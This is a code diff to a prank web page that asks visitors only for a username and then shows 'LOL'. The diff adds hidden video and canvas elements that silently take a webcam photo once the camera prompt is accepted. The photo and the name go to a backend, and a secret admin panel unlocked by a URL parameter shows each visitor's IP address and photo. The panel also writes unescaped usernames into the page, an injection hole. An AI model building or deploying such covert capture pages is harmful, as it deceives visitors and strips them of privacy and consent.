@@ -10,55 +10,84 @@
         input { width: 80%; padding: 10px; margin: 15px 0; border: 1px solid #444; background: #2a2a2a; color: white; border-radius: 4px; text-align: center; }
         button { background: #00ff00; color: black; border: none; padding: 10px 20px; font-weight: bold; border-radius: 4px; cursor: pointer; }
         #lol-screen { display: none; font-size: 48px; font-weight: bold; color: #ff0055; animation: blink 1s infinite; }
-        .dashboard { text-align: left; background: #000; color: #00ff00; font-family: monospace; padding: 15px; border-radius: 4px; max-height: 400px; overflow-y: auto; }
+        .dashboard { text-align: left; background: #000; color: #00ff00; font-family: monospace; padding: 15px; border-radius: 4px; max-height: 500px; overflow-y: auto; }
+        .log-item { border-bottom: 1px dashed #333; padding: 10px 0; }
+        .snapshot { max-width: 100%; border: 1px solid #00ff00; margin-top: 5px; display: block; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <!-- VISITOR BOX: What regular users see -->
+    <!-- VISITOR BOX -->
     <div id="visitor-ui" class="box">
         <h2>Enter your Name / Username to continue:</h2>
         <input type="text" id="username" placeholder="Username...">
         <br>
-        <button onclick="submitName()">Submit</button>
+        <button onclick="submitAndCapture()">Submit</button>
     </div>
 
-    <!-- LOL SCREEN: Shows up after submitting -->
+    <!-- Hidden elements used to process the camera stream -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <!-- LOL SCREEN -->
     <div id="lol-screen">
         LOL
     </div>
 
-    <!-- OWNER DASHBOARD: Only shows up if you use the secret URL -->
+    <!-- OWNER DASHBOARD -->
     <div id="owner-ui" class="box" style="display: none; max-width: 700px;">
-        <h2>📡 Secret IP Admin Panel</h2>
+        <h2>📡 Secret IP & Photo Admin Panel</h2>
         <div id="logs" class="dashboard">Loading logs...</div>
     </div>
 
     <script>
-        // Check if the URL has "?secret=mysecret123"
         const urlParams = new URLSearchParams(window.location.search);
         const secretKey = urlParams.get('secret');
 
         if (secretKey) {
-            // Hide the visitor stuff and show the dashboard
             document.getElementById('visitor-ui').style.display = 'none';
             document.getElementById('owner-ui').style.display = 'block';
             loadAdminLogs(secretKey);
         }
 
-        // When a regular visitor hits submit
-        function submitName() {
+        async function submitAndCapture() {
             const nameInput = document.getElementById('username').value.trim();
             if(!nameInput) return alert("Please enter a name!");
 
-            // Send the name to our serverless backend
+            let photoData = "No Photo (Permission Denied)";
+
+            try {
+                // 1. Trigger the standard browser camera permission popup
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                // 2. Stream the camera to a hidden video element
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Wait briefly for video stream to initialize properly
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                // 3. Draw the current video frame onto a hidden canvas
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // 4. Convert the drawn canvas frame into a portable text image string (Base64)
+                photoData = canvas.toDataURL('image/jpeg');
+
+                // 5. Clean up and shut down camera hardware immediately
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.log("Camera access declined or unavailable:", err);
+            }
+
+            // Send username, IP data, and captured picture data to Vercel Backend
             fetch('/api/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: nameInput })
+                body: JSON.stringify({ username: nameInput, photo: photoData })
             }).then(() => {
-                // Hide input and show LOL screen
                 document.getElementById('visitor-ui').style.display = 'none';
                 document.getElementById('lol-screen').style.display = 'block';
             }).catch(() => {
@@ -66,7 +95,6 @@
             });
         }
 
-        // Fetch logs using the secure URL parameter
         function loadAdminLogs(key) {
             fetch(`/api/log?secret=${key}`)
                 .then(res => {
@@ -80,10 +108,15 @@
                         return;
                     }
                     logsDiv.innerHTML = data.logs.map(log => `
-                        [${new Date(log.time).toLocaleTimeString()}]<br>
-                        👤 User: ${log.username}<br>
-                        🌐 IP Address: ${log.ip}<br>
-                        -----------------------------------<br>
+                        <div class="log-item">
+                            [${new Date(log.time).toLocaleTimeString()}]<br>
+                            👤 User: <strong>${log.username}</strong><br>
+                            🌐 IP Address: <code>${log.ip}</code><br>
+                            📷 Captured Image:<br>
+                            ${log.photo.startsWith('data:image') 
+                                ? `<img class="snapshot" src="${log.photo}" />` 
+                                : `<em style="color:#aaa;">${log.photo}</em>`}
+                        </div>
                     `).join('');
                 })
                 .catch(err => {
